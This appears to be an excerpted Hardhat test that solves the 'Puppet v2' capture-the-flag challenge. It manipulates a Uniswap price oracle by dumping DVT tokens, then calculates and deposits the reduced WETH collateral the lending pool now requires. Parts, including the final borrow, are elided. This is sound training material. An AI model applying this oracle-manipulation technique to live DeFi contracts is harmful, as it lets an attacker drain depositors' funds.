...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        //console.log(await this.lendingPool.connect(attacker).calculateDepositOfWETHRequired(ethers.utils.parseEther("100000")));
        displayBigInt("initial collateral", await this.lendingPool.connect(attacker).calculateDepositOfWETHRequired(ethers.utils.parseEther("100000")));
        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ethers.utils.parseEther("9999"), ethers.utils.parseEther("9.5"), [this.token.address, this.weth.address], attacker.address, deadline);
        displayBalances(await ethers.provider.getBalance(attacker.address), await this.token.balanceOf(attacker.address));
        let ethCollateralPerDVT = await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther("1"))
        //let totalEthCollateral = ethCollateralPerDVT.mul(100000)
        let totalEthCollateral = await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther("1000000"));
        displayBigInt("collateral exploit", totalEthCollateral);
        await this.weth.connect(attacker).deposit({value : totalEthCollateral}); 
        displayBigInt("weth after deposit", await this.weth.balanceOf(attacker.address));
        await this.weth.connect(attacker).approve(this.lendingPool.address, totalEthCollateral)
...
function displayBigInt(message, bigInt){
    let decimal = ethers.BigNumber.from(10**9).mul(ethers.BigNumber.from(10**9))
    console.log(message + ":" + bigInt.div(decimal).toString());
}

function displayBalances(ethBal, tokBal){
    let decimal = ethers.BigNumber.from(10**9).mul(ethers.BigNumber.from(10**9))
    console.log("Attacker balances : eth : "+ ethBal.div(decimal).toString() + ", dvt : " + tokBal.div(decimal).toString());
}